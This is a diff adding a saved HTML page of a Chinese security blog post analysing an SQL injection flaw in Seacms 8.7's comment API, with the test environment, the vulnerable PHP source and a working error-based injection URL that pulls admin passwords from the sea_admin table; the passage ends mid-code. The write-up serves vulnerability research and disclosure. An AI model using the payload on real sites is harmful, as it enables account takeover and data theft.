@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>Seacms 8.7版本SQL注入分析 - F0rmat的博客 | 专注于网络攻防和信息安全</title>
+
+<meta name="description" content="0x01 前言 好像没发文章了，在t00ls看到一篇seacms8.7的分析文，不过不是最新的版本，好久没看到seacms和maccms这两个cms发新的漏洞了，那个过滤有点恶心。后来还在nosec看到一篇离新版9.0比较近的一个版本8.9的一个变量覆盖到sql注入文章，但是我复现不成功，我拿的是6.53的版本，原因后面会讲到。
+0x02 环境 Web： phpstudy and MAMP System： Windows 7 X64 and MacOS Browser： Firefox Quantum and Chrome MySQL： 5.5 php： 5.4
+0x03 漏洞详情 漏洞复现 payload:
+http://10.211.55.4/upload/comment/api/index.php?gid=1&amp;amp;page=2&amp;amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27` 漏洞分析 在此之前我在MySQL 5.6、5.7上面复现都不成功，因为这两个版本用extractvalue()、updatexml()报错注入不成功，后来换了系统Linux和Windows还有macOS来测试也是一样，和PHP、Apache的版本没有影响只要的还是MySQL的版本问题，所以大家测试的时候注意一下版本。
+漏洞文件是在：comment/api/index.php
+&amp;lt;?php session_start(); require_once(&amp;#34;../../include/common.php&amp;#34;); $id = (isset($gid) &amp;amp;&amp;amp; is_numeric($gid)) ? $gid : 0; $page = (isset($page) &amp;amp;&amp;amp; is_numeric($page)) ? $page : 1; $type = (isset($type) &amp;amp;&amp;amp; is_numeric($type)) ? $type : 1; $pCount = 0; $jsoncachefile = sea_DATA.&amp;#34;/cache/review/$type/$id.js&amp;#34;; //缓存第一页的评论 if($page&amp;lt;2) { if(file_exists($jsoncachefile)) { $json=LoadFile($jsoncachefile); die($json); } } $h = ReadData($id,$page); $rlist = array(); if($page&amp;lt;2) { createTextFile($h,$jsoncachefile); } die($h);	function ReadData($id,$page) { global $type,$pCount,$rlist; $ret = array(&amp;#34;&amp;#34;,&amp;#34;&amp;#34;,$page,0,10,$type,$id); if($id&amp;gt;0) { $ret[0] = Readmlist($id,$page,$ret[4]); $ret[3] = $pCount; $x = implode(&amp;#39;,&amp;#39;,$rlist); if(!" /><meta name="keywords"
+  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
+
+
+<link rel="stylesheet" href="https://getshe11.com/css/main.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">
+
+
+
+<meta property="og:title" content="Seacms 8.7版本SQL注入分析" />
+<meta property="og:description" content="0x01 前言 好像没发文章了，在t00ls看到一篇seacms8.7的分析文，不过不是最新的版本，好久没看到seacms和maccms这两个cms发新的漏洞了，那个过滤有点恶心。后来还在nosec看到一篇离新版9.0比较近的一个版本8.9的一个变量覆盖到sql注入文章，但是我复现不成功，我拿的是6.53的版本，原因后面会讲到。
+0x02 环境 Web： phpstudy and MAMP System： Windows 7 X64 and MacOS Browser： Firefox Quantum and Chrome MySQL： 5.5 php： 5.4
+0x03 漏洞详情 漏洞复现 payload:
+http://10.211.55.4/upload/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27` 漏洞分析 在此之前我在MySQL 5.6、5.7上面复现都不成功，因为这两个版本用extractvalue()、updatexml()报错注入不成功，后来换了系统Linux和Windows还有macOS来测试也是一样，和PHP、Apache的版本没有影响只要的还是MySQL的版本问题，所以大家测试的时候注意一下版本。
+漏洞文件是在：comment/api/index.php
+&lt;?php session_start(); require_once(&#34;../../include/common.php&#34;); $id = (isset($gid) &amp;&amp; is_numeric($gid)) ? $gid : 0; $page = (isset($page) &amp;&amp; is_numeric($page)) ? $page : 1; $type = (isset($type) &amp;&amp; is_numeric($type)) ? $type : 1; $pCount = 0; $jsoncachefile = sea_DATA.&#34;/cache/review/$type/$id.js&#34;; //缓存第一页的评论 if($page&lt;2) { if(file_exists($jsoncachefile)) { $json=LoadFile($jsoncachefile); die($json); } } $h = ReadData($id,$page); $rlist = array(); if($page&lt;2) { createTextFile($h,$jsoncachefile); } die($h);	function ReadData($id,$page) { global $type,$pCount,$rlist; $ret = array(&#34;&#34;,&#34;&#34;,$page,0,10,$type,$id); if($id&gt;0) { $ret[0] = Readmlist($id,$page,$ret[4]); $ret[3] = $pCount; $x = implode(&#39;,&#39;,$rlist); if(!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://getshe11.com/post/seacms8.7-sql-injection-analysis/" />
+<meta property="article:published_time" content="2019-03-04T15:49:11+00:00" />
+<meta property="article:modified_time" content="2019-03-04T15:49:11+00:00" />
+<meta itemprop="name" content="Seacms 8.7版本SQL注入分析">
+<meta itemprop="description" content="0x01 前言 好像没发文章了，在t00ls看到一篇seacms8.7的分析文，不过不是最新的版本，好久没看到seacms和maccms这两个cms发新的漏洞了，那个过滤有点恶心。后来还在nosec看到一篇离新版9.0比较近的一个版本8.9的一个变量覆盖到sql注入文章，但是我复现不成功，我拿的是6.53的版本，原因后面会讲到。
+0x02 环境 Web： phpstudy and MAMP System： Windows 7 X64 and MacOS Browser： Firefox Quantum and Chrome MySQL： 5.5 php： 5.4
+0x03 漏洞详情 漏洞复现 payload:
+http://10.211.55.4/upload/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27` 漏洞分析 在此之前我在MySQL 5.6、5.7上面复现都不成功，因为这两个版本用extractvalue()、updatexml()报错注入不成功，后来换了系统Linux和Windows还有macOS来测试也是一样，和PHP、Apache的版本没有影响只要的还是MySQL的版本问题，所以大家测试的时候注意一下版本。
+漏洞文件是在：comment/api/index.php
+&lt;?php session_start(); require_once(&#34;../../include/common.php&#34;); $id = (isset($gid) &amp;&amp; is_numeric($gid)) ? $gid : 0; $page = (isset($page) &amp;&amp; is_numeric($page)) ? $page : 1; $type = (isset($type) &amp;&amp; is_numeric($type)) ? $type : 1; $pCount = 0; $jsoncachefile = sea_DATA.&#34;/cache/review/$type/$id.js&#34;; //缓存第一页的评论 if($page&lt;2) { if(file_exists($jsoncachefile)) { $json=LoadFile($jsoncachefile); die($json); } } $h = ReadData($id,$page); $rlist = array(); if($page&lt;2) { createTextFile($h,$jsoncachefile); } die($h);	function ReadData($id,$page) { global $type,$pCount,$rlist; $ret = array(&#34;&#34;,&#34;&#34;,$page,0,10,$type,$id); if($id&gt;0) { $ret[0] = Readmlist($id,$page,$ret[4]); $ret[3] = $pCount; $x = implode(&#39;,&#39;,$rlist); if(!">
+<meta itemprop="datePublished" content="2019-03-04T15:49:11+00:00" />
+<meta itemprop="dateModified" content="2019-03-04T15:49:11+00:00" />
+<meta itemprop="wordCount" content="410">
+
+
+
+<meta itemprop="keywords" content="漏洞,代码审计,php,seacms," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Seacms 8.7版本SQL注入分析"/>
+<meta name="twitter:description" content="0x01 前言 好像没发文章了，在t00ls看到一篇seacms8.7的分析文，不过不是最新的版本，好久没看到seacms和maccms这两个cms发新的漏洞了，那个过滤有点恶心。后来还在nosec看到一篇离新版9.0比较近的一个版本8.9的一个变量覆盖到sql注入文章，但是我复现不成功，我拿的是6.53的版本，原因后面会讲到。
+0x02 环境 Web： phpstudy and MAMP System： Windows 7 X64 and MacOS Browser： Firefox Quantum and Chrome MySQL： 5.5 php： 5.4
+0x03 漏洞详情 漏洞复现 payload:
+http://10.211.55.4/upload/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27` 漏洞分析 在此之前我在MySQL 5.6、5.7上面复现都不成功，因为这两个版本用extractvalue()、updatexml()报错注入不成功，后来换了系统Linux和Windows还有macOS来测试也是一样，和PHP、Apache的版本没有影响只要的还是MySQL的版本问题，所以大家测试的时候注意一下版本。
+漏洞文件是在：comment/api/index.php
+&lt;?php session_start(); require_once(&#34;../../include/common.php&#34;); $id = (isset($gid) &amp;&amp; is_numeric($gid)) ? $gid : 0; $page = (isset($page) &amp;&amp; is_numeric($page)) ? $page : 1; $type = (isset($type) &amp;&amp; is_numeric($type)) ? $type : 1; $pCount = 0; $jsoncachefile = sea_DATA.&#34;/cache/review/$type/$id.js&#34;; //缓存第一页的评论 if($page&lt;2) { if(file_exists($jsoncachefile)) { $json=LoadFile($jsoncachefile); die($json); } } $h = ReadData($id,$page); $rlist = array(); if($page&lt;2) { createTextFile($h,$jsoncachefile); } die($h);	function ReadData($id,$page) { global $type,$pCount,$rlist; $ret = array(&#34;&#34;,&#34;&#34;,$page,0,10,$type,$id); if($id&gt;0) { $ret[0] = Readmlist($id,$page,$ret[4]); $ret[3] = $pCount; $x = implode(&#39;,&#39;,$rlist); if(!"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+</head>
+
+<body>
+    <div class="header-placeholder"></div>
+    
+    <header class="header">
+        <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    
+    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
+    
+    <nav class="site-nav">
+        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
+    </nav>
+</div>
+
+    </header>
+
+    
+    <div class="page-content">
+        <div class="wrapper">
+            
+            <div class="col-main">
+                <div class="post">
+    
+    <header class="post-header">
+        <h1 class="post-title">Seacms 8.7版本SQL注入分析</h1>
+        <p class="post-meta">Mar 04, 2019</p>
+    </header>
+    <article class="post-content">
+        
+        
+        
+        
+        
+        
+        <h1 id="0x01-前言">0x01 前言</h1>
+<p>好像没发文章了，在t00ls看到一篇seacms8.7的分析文，不过不是最新的版本，好久没看到seacms和maccms这两个cms发新的漏洞了，那个过滤有点恶心。后来还在nosec看到一篇离新版9.0比较近的一个版本8.9的一个变量覆盖到sql注入文章，但是我复现不成功，我拿的是6.53的版本，原因后面会讲到。</p>
+<h1 id="0x02-环境">0x02 环境</h1>
+<p><strong>Web：</strong> phpstudy and MAMP
+<strong>System：</strong> Windows 7 X64 and MacOS
+<strong>Browser：</strong> Firefox Quantum and Chrome
+<strong>MySQL：</strong>  5.5
+<strong>php：</strong>  5.4</p>
+<h1 id="0x03-漏洞详情">0x03 漏洞详情</h1>
+<!-- raw HTML omitted -->
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>payload:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">http://10.211.55.4/upload/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27`
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/1.png" alt=""></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>在此之前我在MySQL 5.6、5.7上面复现都不成功，因为这两个版本用<code>extractvalue()</code>、<code>updatexml()</code>报错注入不成功，后来换了系统Linux和Windows还有macOS来测试也是一样，和PHP、Apache的版本没有影响只要的还是MySQL的版本问题，所以大家测试的时候注意一下版本。</p>
+<p>漏洞文件是在：<code>comment/api/index.php</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">session_start</span><span class="p">();</span>
+<span class="k">require_once</span><span class="p">(</span><span class="s2">&#34;../../include/common.php&#34;</span><span class="p">);</span>
+<span class="nv">$id</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$gid</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$gid</span><span class="p">))</span> <span class="o">?</span> <span class="nv">$gid</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$page</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="o">?</span> <span class="nv">$page</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nv">$type</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$type</span><span class="p">))</span> <span class="o">?</span> <span class="nv">$type</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nv">$pCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$jsoncachefile</span> <span class="o">=</span> <span class="nx">sea_DATA</span><span class="o">.</span><span class="s2">&#34;/cache/review/</span><span class="si">$type</span><span class="s2">/</span><span class="si">$id</span><span class="s2">.js&#34;</span><span class="p">;</span>
+<span class="c1">//缓存第一页的评论
+</span><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nv">$page</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$jsoncachefile</span><span class="p">))</span>
+	<span class="p">{</span>
+		<span class="nv">$json</span><span class="o">=</span><span class="nx">LoadFile</span><span class="p">(</span><span class="nv">$jsoncachefile</span><span class="p">);</span>
+		<span class="k">die</span><span class="p">(</span><span class="nv">$json</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$h</span> <span class="o">=</span> <span class="nx">ReadData</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$page</span><span class="p">);</span>
+<span class="nv">$rlist</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$page</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="nx">createTextFile</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$jsoncachefile</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">die</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>	
+
+
+<span class="k">function</span> <span class="nf">ReadData</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$page</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">global</span> <span class="nv">$type</span><span class="p">,</span><span class="nv">$pCount</span><span class="p">,</span><span class="nv">$rlist</span><span class="p">;</span>
+	<span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="nv">$type</span><span class="p">,</span><span class="nv">$id</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$id</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="nv">$ret</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">Readmlist</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="nv">$ret</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+		<span class="nv">$ret</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$pCount</span><span class="p">;</span>
+		<span class="nv">$x</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="nv">$rlist</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$x</span><span class="p">))</span>
+		<span class="p">{</span>
+		<span class="nv">$ret</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">Readrlist</span><span class="p">(</span><span class="nv">$x</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>	
+	<span class="nv">$readData</span> <span class="o">=</span> <span class="nx">FormatJson</span><span class="p">(</span><span class="nv">$ret</span><span class="p">);</span>
+	<span class="k">return</span> <span class="nv">$readData</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">Readmlist</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="nv">$size</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">global</span> <span class="nv">$dsql</span><span class="p">,</span><span class="nv">$type</span><span class="p">,</span><span class="nv">$pCount</span><span class="p">,</span><span class="nv">$rlist</span><span class="p">;</span>
+	<span class="nv">$ml</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$id</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="nv">$sqlCount</span> <span class="o">=</span> <span class="s2">&#34;SELECT count(*) as dd FROM sea_comment WHERE m_type=</span><span class="si">$type</span><span class="s2"> AND v_id=</span><span class="si">$id</span><span class="s2"> ORDER BY id DESC&#34;</span><span class="p">;</span>
+		<span class="nv">$rs</span> <span class="o">=</span> <span class="nv">$dsql</span> <span class="o">-&gt;</span><span class="na">GetOne</span><span class="p">(</span><span class="nv">$sqlCount</span><span class="p">);</span>
+		<span class="nv">$pCount</span> <span class="o">=</span> <span class="nx">ceil</span><span class="p">(</span><span class="nv">$rs</span><span class="p">[</span><span class="s1">&#39;dd&#39;</span><span class="p">]</span><span class="o">/</span><span class="nv">$size</span><span class="p">);</span>
+		<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=</span><span class="si">$type</span><span class="s2"> AND v_id=</span><span class="si">$id</span><span class="s2"> ORDER BY id DESC limit &#34;</span><span class="o">.</span><span class="p">(</span><span class="nv">$page</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="nv">$size</span><span class="o">.</span><span class="s2">&#34;,</span><span class="si">$size</span><span class="s2"> &#34;</span><span class="p">;</span>
+		<span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">setQuery</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+		<span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">Execute</span><span class="p">(</span><span class="s1">&#39;commentmlist&#39;</span><span class="p">);</span>
+		<span class="k">while</span><span class="p">(</span><span class="nv">$row</span><span class="o">=</span><span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">GetArray</span><span class="p">(</span><span class="s1">&#39;commentmlist&#39;</span><span class="p">))</span>
+		<span class="p">{</span>
+			<span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;reply&#39;</span><span class="p">]</span><span class="o">.=</span><span class="nx">ReadReplyID</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;reply&#39;</span><span class="p">],</span><span class="nv">$rlist</span><span class="p">);</span>
+			<span class="nv">$ml</span><span class="p">[]</span><span class="o">=</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">cmid</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">uid</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">tmp</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">nick</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">face</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">star</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">anony</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">from</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">time</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y/n/j H:i:s&#34;</span><span class="p">,</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;dtime&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">reply</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;reply&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">content</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">agree</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;agree&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">aginst</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;anti&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">pic</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pic&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">vote</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;vote&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">allow</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;anti&#39;</span><span class="p">])</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">check</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;ischeck&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">}&#34;</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="nv">$readmlist</span><span class="o">=</span><span class="nx">join</span><span class="p">(</span><span class="nv">$ml</span><span class="p">,</span><span class="s2">&#34;,&#34;</span><span class="p">);</span>
+	<span class="k">return</span> <span class="nv">$readmlist</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">Readrlist</span><span class="p">(</span><span class="nv">$ids</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="nv">$size</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">global</span> <span class="nv">$dsql</span><span class="p">,</span><span class="nv">$type</span><span class="p">;</span>
+	<span class="nv">$rl</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
+	<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=</span><span class="si">$type</span><span class="s2"> AND id in (</span><span class="si">$ids</span><span class="s2">) ORDER BY id DESC&#34;</span><span class="p">;</span>
+	<span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">setQuery</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+	<span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">Execute</span><span class="p">(</span><span class="s1">&#39;commentrlist&#39;</span><span class="p">);</span>
+	<span class="k">while</span><span class="p">(</span><span class="nv">$row</span><span class="o">=</span><span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">GetArray</span><span class="p">(</span><span class="s1">&#39;commentrlist&#39;</span><span class="p">))</span>
+	<span class="p">{</span>
+		<span class="nv">$rl</span><span class="p">[]</span><span class="o">=</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">:{</span><span class="se">\&#34;</span><span class="s2">uid</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">tmp</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">nick</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">face</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">star</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">anony</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">from</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">time</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;dtime&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">reply</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span 